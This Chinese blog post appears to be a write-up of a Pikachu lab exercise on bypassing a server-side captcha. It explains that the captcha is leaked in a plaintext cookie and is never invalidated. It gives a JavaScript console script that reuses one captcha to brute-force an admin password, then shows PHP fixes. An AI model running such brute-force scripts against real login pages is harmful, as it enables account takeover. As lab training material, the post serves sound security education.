---
title: Pikachu 验证码绕过（on server）
date: 2026-11-04 17:50:00
tags:
  - Pikachu
  - 验证码
  - 暴力破解
  - Session
categories:
  - 网络渗透
  - Pikachu实验
---

## 名词解析

- **HTTP 请求**：你点提交，浏览器把填的内容打包发给服务器。填在表单里的内容随请求体一起发出去，走 POST；拼在地址栏 `?a=1` 后面那种参数走 GET。
- **Cookie、Session**：Cookie 存在你的浏览器里，是你的编号、手牌；Session 存在服务器上，浏览器只拿一个编号去认领对应的内容。

验证码从生成到被复用的六步时间线：

{% asset_img 01-vcode-timeline.png %}
*图 1　验证码从生成到被复用的六步*

## 流程（分析码源）

① 打开登录页，页面上有一行 `<img src="../../inc/showvcode.php">`。浏览器看到这个标签，就去请求这张图。

② 服务器执行 `showvcode.php`，验证码在这里生成：

{% asset_img 02-showvcode-source.jpeg %}
*图 2　showvcode.php 源码*

打开 session，前端随机生成 6 位，存进 Session。

**漏洞 1**：服务端将验证码字符串以明文 COOKIE 的方式给了前端。

验证码的校验：

{% asset_img 03-check-source.png %}
*图 3　登录处对验证码的校验*

**漏洞 2**：验证码校验完后并没有销毁。

## 执行脚本

```javascript
(async () => {
  const vc = 'pifd3y';
  const list = ['123456','000000','abc123','admin','password','12345678','qwerty','111111'];
  for (let i = 0; i < list.length; i++) {
    const r = await fetch(location.pathname, {
      // fetch 是「在页面后台发一个请求」，页面不重新加载
      method: 'POST',     // 用 POST，和点 Login 一样
      headers: {'Content-Type':'application/x-www-form-urlencoded'},
      body: new URLSearchParams({username:'admin', password:list[i], vcode:vc, submit:'Login'})
    });
    const t = await r.text();
    if (t.includes('验证码输入错误')) { console.log('码失效了，刷新页面重新看图再来'); return; }
    console.log('第' + (i+1) + '次  ' + vc + ' / ' + list[i] + '  →  ' + (t.includes('login success') ? '✓ 正确' : '✗ 密码错'));
  }
})();
```

把「点按钮」换成了「发请求」，所以绕过了「提交就换码」这个副作用。

{% asset_img 04-console-8-attempts.jpeg %}
*图 4　同一个验证码连发 8 次请求*

- 同一个验证码被用了 **8 次**，服务端一次都没要求更换，也未销毁；8 行输出里，从头到尾没有一行提示「验证码错误」。
- 每次请求都走完了「验证码校验 → 查数据库」流程，不是被拦掉的。

**==》密码就是 `123456`**

{% asset_img 05-cookie-vcode.jpeg %}
*图 5　Cookie 里躺着明文的 `bf[vcode]=pifd3y`*

## 修改码源

**1. 校验完立刻销毁**

```php
// 改后
if (strtolower($_POST['vcode']) !== strtolower($_SESSION['vcode'])) {
    unset($_SESSION['vcode']);                       // 错了也销毁，防止无限猜码
    $html .= "<p class='notice'>验证码输入错误哦！</p>";
}else{
    unset($_SESSION['vcode']);                       // 通过立刻销毁：一码一用
    // ……其余登录逻辑不变
}
```

**2. 把答案明文发给浏览器，必须删**

```php
setcookie('bf[vcode]', $_SESSION['vcode']);
```

**3. 加失败计数**

```php
// 登录失败的分支里
$_SESSION['bf_fail'] = ($_SESSION['bf_fail'] ?? 0) + 1;
if ($_SESSION['bf_fail'] >= 5) {
    $html .= "<p class='notice'>失败次数过多，请 10 分钟后再试</p>";
    // 实际项目里这里应该记录 IP + 时间，锁定 10 分钟
}
```

> 本文实验仅在自己的本地 Pikachu 靶场中进行。
